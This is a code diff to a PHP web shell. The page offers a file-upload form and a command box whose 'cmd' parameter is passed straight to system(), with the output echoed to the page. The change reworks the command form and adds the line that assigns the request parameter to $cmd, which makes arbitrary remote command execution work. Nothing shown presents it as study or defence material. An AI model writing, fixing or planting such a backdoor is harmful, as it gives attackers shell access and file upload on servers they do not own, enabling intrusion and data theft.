@@ -116,14 +116,16 @@ echo '<form enctype="multipart/form-data" method="POST"><font color="blue">
 Upload File<input type="file" name="file" />
 <input type="submit" value="Upload" />
 </form><br>
-<form method="get" style="margin-top: 15px;" name="myform" action="?path='.$path.'&">
-			  @Command ~ $&nbsp;&nbsp;<input style="border: 1px solid lime;" type="text" name="cmd" bgcolor="lime">
-			  <input style="border: none; border-bottom: 1px solid #ffffff;" class="input" type="submit" value=">> ">
-			  </form>
+<form method="get" style="margin-top: 15px;" name="myform" action="">
+    <label>@Command ~ $&nbsp;&nbsp;</label>
+    <input style="border: 1px solid lime; width: 60%;" type="text" name="cmd" placeholder="whoami or ls -la">
+    <input style="border: none; border-bottom: 1px solid #ffffff;" type="submit" value="Execute">
+</form>
 </td></tr>
 
 ';
 if($_GET['cmd']){
+ $cmd = $_GET['cmd'];
  echo '<br><td><tr><textarea>'.htmlspecialchars(system($cmd)).'</td></tr></textarea><br>';
  
 }
